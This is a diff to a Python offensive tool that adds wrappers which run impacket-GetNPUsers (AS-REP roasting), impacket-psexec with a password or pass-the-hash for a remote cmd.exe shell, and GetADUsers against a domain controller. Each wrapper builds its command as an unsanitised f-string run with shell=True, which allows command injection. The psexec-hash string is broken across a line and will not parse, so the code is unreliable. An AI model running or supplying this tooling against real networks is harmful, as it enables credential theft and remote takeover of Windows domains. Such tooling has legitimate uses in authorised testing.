@@ -211,3 +211,32 @@ def run_kerbrute(url, domain, user):
         subprocess.run(command, shell=True)
     except Exception as e:
         print(f"{RED}Error running kerbrute: {e}{RESET}")
+
+def run_GetNPUsers(url, domain):
+    try:
+        command = f"impacket-GetNPUsers -dc-ip {url} -request '{domain}/'"
+        subprocess.run(command, shell=True)
+    except Exception as e:
+        print(f"{RED}Error running GetNPUsers: {e}{RESET}")
+
+def run_psexec_password(url, user, password):
+    try:
+        command = f"impacket-psexec {user}:{password}@{url} cmd.exe"
+        subprocess.run(command, shell=True)
+    except Exception as e:
+        print(f"{RED}Error running psexec: {e}{RESET}")
+
+def run_psexec_hash(url, user, hash):
+    try:
+        command = f"impacket-psexec -hashes {hash} 
+{user}@{url}"
+        subprocess.run(command, shell=True)
+    except Exception as e:
+        print(f"{RED}Error running psexec: {e}{RESET}")
+
+def run_GetADUsers(url, domain):
+    try:
+        command = f"GetADUsers.py -all '{domain}/' -dc-ip {url}"
+        subprocess.run(command, shell=True)
+    except Exception as e:
+        print(f"{RED}Error running GetADUsers: {e}{RESET}")
